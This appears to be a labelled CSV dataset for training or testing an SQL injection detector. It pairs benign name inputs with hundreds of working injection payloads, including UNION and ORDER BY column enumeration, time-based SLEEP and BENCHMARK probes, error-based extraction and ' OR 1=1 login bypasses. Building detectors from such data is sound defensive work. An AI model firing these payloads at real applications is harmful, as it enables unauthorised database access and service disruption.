"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Fran',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
'Charlie',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
"'""""*""""'",SQL Injection
'Bob',Normal
'OR 1=1',SQL Injection
"'"""" or """"x""""=""""x'",SQL Injection
'Eve',Normal
'+ SLEEP(10) + '',SQL Injection
'Grace',Normal
'David',Normal
'John',Normal
'David',Normal
'Grace',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'",SQL Injection
'Hank',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'",SQL Injection
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
'ORDER BY 31337--',SQL Injection
'Alice',Normal
'John',Normal
'or pg_SLEEP(5)--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Eve',Normal
'Alice',Normal
'Bob',Normal
'\',SQL Injection
'David',Normal
'Alice',Normal
"'and (select substring(@@version,3,1))='S''",SQL Injection
'Jill',Normal
'Alice',Normal
'ORDER BY 28--',SQL Injection
'ORDER BY SLEEP(5)#',SQL Injection
'ORDER BY 12#',SQL Injection
'Eve',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
'Grace',Normal
'Alice',Normal
'Jill',Normal
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
'/',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
'John',Normal
'Charlie',Normal
'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
'Grace',Normal
'Alice',Normal
'David',Normal
'Charlie',Normal
'Grace',Normal
'Alice',Normal
'Eve',Normal
''));,SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=0--',SQL Injection
'Grace',Normal
'Bob',Normal
'OR 1=1',SQL Injection
'Grace',Normal
'Alice',Normal
'Fran',Normal
'Charlie',Normal
'Bob',Normal
'Charlie',Normal
'Eve',Normal
'Hank',Normal
'Charlie',Normal
'Fran',Normal
'Eve',Normal
'Fran',Normal
'Charlie',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
'1 AND (SELECT * FROM Users) = 1',SQL Injection
'John',Normal
'OR x=x',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'",SQL Injection
'/',SQL Injection
'1) or sleep(5)#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
'Alice',Normal
'Jill',Normal
'Charlie',Normal
'Alice',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
'ORDER BY 30--',SQL Injection
''LIKE'',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'Alice',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--'",SQL Injection
'Charlie',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
'Alice',Normal
"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
'David',Normal
'Fran',Normal
'David',Normal
'Hank',Normal
'WHERE 1=1 AND 1=1',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'Bob',Normal
'Grace',Normal
'AnD SLEEP(5)#',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
'Fran',Normal
"'"""")) or benchmark(10000000,MD5(1))#'",SQL Injection
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
'Hank',Normal
'Alice',Normal
'Hank',Normal
'Jill',Normal
'Eve',Normal
'ORDER BY 30',SQL Injection
'Charlie',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
'Fran',Normal
'AS INJECTX WHERE 1=1 AND 1=0--',SQL Injection
'Alice',Normal
'AND 0',SQL Injection
'Fran',Normal
'Fran',Normal
'Jill',Normal
'Eve',Normal
'/*  	C-style comment',SQL Injection
'Alice',Normal
'Grace',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'",SQL Injection
'Hank',Normal
'David',Normal
'David',Normal
'John',Normal
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Eve',Normal
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'HAVING 1=0#',SQL Injection
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
'Fran',Normal
'David',Normal
'John',Normal
'ORDER BY 27',SQL Injection
'David',Normal
'/',SQL Injection
'John',Normal
'' OR '1',SQL Injection
'David',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Jill',Normal
'&&SLEEP(5)--',SQL Injection
'John',Normal
'John',Normal
'Hank',Normal
'' OR '1'='1' --',SQL Injection
'Hank',Normal
'John',Normal
'ORDER BY 15#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
'John',Normal
'Bob',Normal
'Bob',Normal
'David',Normal
'Charlie',Normal
'John',Normal
'Bob',Normal
'Alice',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
'Fran',Normal
'Jill',Normal
'Alice',Normal
'John',Normal
'Alice',Normal
'David',Normal
'Alice',Normal
'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
'John',Normal
'ORDER BY 30',SQL Injection
"'benchmark(50000000,MD5(1))'",SQL Injection
'Charlie',Normal
'Grace',Normal
'ORDER BY 28#',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
'Eve',Normal
'pg_SLEEP(5)#',SQL Injection
'Bob',Normal
'Bob',Normal
'OR 1=0--',SQL Injection
'Fran',Normal
'Alice',Normal
'Charlie',Normal
'Fran',Normal
'Fran',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
'Grace',Normal
'Fran',Normal
'Eve',Normal
'Fran',Normal
"'-1' UNION SELECT 1,2,3--+'",SQL Injection
"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
'Jill',Normal
'Fran',Normal
'Alice',Normal
'&&SLEEP(5)--',SQL Injection
'OR 1=1',SQL Injection
'admin' or '1'='1'--',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'Alice',Normal
'Jill',Normal
'ORDER BY 29',SQL Injection
"'admin""""or 1=1 or """"""""=""""'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'",SQL Injection
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
'HAVING 1=0',SQL Injection
'Eve',Normal
'Eve',Normal
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'Eve',Normal
'Eve',Normal
'admin' or '1'='1'/*',SQL Injection
'Eve',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'John',Normal
'Grace',Normal
'Bob',Normal
'David',Normal
'Grace',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
'Eve',Normal
'`',SQL Injection
'Jill',Normal
'David',Normal
'Bob',Normal
'Hank',Normal
'Jill',Normal
'ORDER BY 11',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'Alice',Normal
'AND 1=0#',SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
'Eve',Normal
'Charlie',Normal
'David',Normal
"'"""");",SQL Injection
'ORDER BY 4',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'",SQL Injection
'David',Normal
'Hank',Normal
'Fran',Normal
'Hank',Normal
'Grace',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
'Jill',Normal
'') or pg_sleep(5)--',SQL Injection
'+ SLEEP(10) + '',SQL Injection
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'",SQL Injection
''LIKE'',SQL Injection
'David',Normal
'John',Normal
"'"""" or """"""""-""""'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Charlie',Normal
'Hank',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT USER(),SLEEP(5)--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'",SQL Injection
'ORDER BY SLEEP(5)',SQL Injection
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
'Grace',Normal
'ORDER BY 30#',SQL Injection
"'"""";",SQL Injection
'John',Normal
'Alice',Normal
'Bob',Normal
'Hank',Normal
'Hank',Normal
'AnD SLEEP(5)#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'/*…*/',SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'Alice',Normal
'SLEEP(5)--',SQL Injection
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--'",SQL Injection
"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
'admin' or '1'='1',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
'Jill',Normal
'Eve',Normal
'John',Normal
'John',Normal
'AND 1=0',SQL Injection
'Alice',Normal
'Jill',Normal
"'"""" OR 1 = 1 -- -'",SQL Injection
'John',Normal
"''\""""'",SQL Injection
'David',Normal
'David',Normal
'Hank',Normal
'Grace',Normal
'David',Normal
'Bob',Normal
'Eve',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Grace',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
'' OR '1'='1',SQL Injection
'-2',SQL Injection
'AnD SLEEP(5)',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7'",SQL Injection
'Charlie',Normal
'David',Normal
'Fran',Normal
'Hank',Normal
'John',Normal
'Alice',Normal
'Bob',Normal
'David',Normal
Microservice running on port 84563,Normal
'David',Normal
'ORDER BY 13',SQL Injection
'Grace',Normal
'' OR '1'='1' --',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'Grace',Normal
"'benchmark(50000000,MD5(1))'",SQL Injection
'Jill',Normal
'Eve',Normal
'Alice',Normal
'Hank',Normal
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#'",SQL Injection
'ORDER BY 18',SQL Injection
'ORDER BY 9',SQL Injection
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#'",SQL Injection
'&&SLEEP(5)#',SQL Injection
'Jill',Normal
'Bob',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'/*  	C-style comment',SQL Injection
'Alice',Normal
'Charlie',Normal
'Charlie',Normal
'Bob',Normal
'ORDER BY 31337#',SQL Injection
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
'Bob',Normal
Microservice running on port 3000,Normal
'Fran',Normal
'David',Normal
'Alice',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
'UNION ALL SELECT 1',SQL Injection
'John',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
'ORDER BY 26#',SQL Injection
'Eve',Normal
'Jill',Normal
'Hank',Normal
'Eve',Normal
'Alice',Normal
'Hank',Normal
'ORDER BY 10',SQL Injection
'Fran',Normal
'Grace',Normal
'Charlie',Normal
